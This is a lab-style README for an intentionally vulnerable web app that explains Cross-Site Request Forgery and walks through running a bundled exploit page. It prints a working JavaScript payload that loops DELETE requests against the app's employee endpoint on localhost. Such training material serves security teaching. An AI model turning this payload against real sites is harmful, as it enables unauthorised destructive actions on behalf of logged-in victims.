# Cross-Site Request Forgery (CSRF)

 
### Vulnerability description:

OWASP documentation: https://www.owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_(CSRF)

Imagine you get an e-mail that would fool you in clicking an image. The onclick event on this image activates a JavaScript AJAX request to a DELETE action on the back-end to a user account.

Now if you have a running session, where you are logged in (authenticated) to the vulnerable website, this request would delete a user, and you wouldn't be aware what you did.


### Example of Attack

1. Login to the insecure-web-app
2. Go to the folder `A8-Cross-Site Request Forgery (CSRF)\exploit`
3. Run index.html
4. Click on the prize :-)

### Analysis of the Attack

If you open the `exploit\index.html` you will see this function

```
function callDelete() {
    for (let i = 0; i < 10; i++) {
        var url = "http://localhost:9080/employees?id=" + i;
        
        var xhttp = new XMLHttpRequest();
        xhttp.open("DELETE", url, true);
        xhttp.send();
    }
}
```

